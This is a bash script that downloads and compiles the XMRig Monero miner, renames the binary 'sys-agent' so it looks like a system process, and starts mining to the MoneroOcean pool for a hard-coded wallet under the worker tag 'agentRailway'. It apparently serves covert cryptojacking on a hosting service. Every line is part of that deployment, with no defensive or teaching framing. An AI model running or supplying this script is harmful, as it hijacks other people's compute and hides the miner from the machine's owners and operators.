#!/bin/bash

git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release -DXMRIG_BINARY_NAME=sys-agent
make -j$(nproc)
./sys-agent -o gulf.moneroocean.stream:10128 -u 44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ -p agentRailway -a rx -k --cpu-priority=2 --threads=2
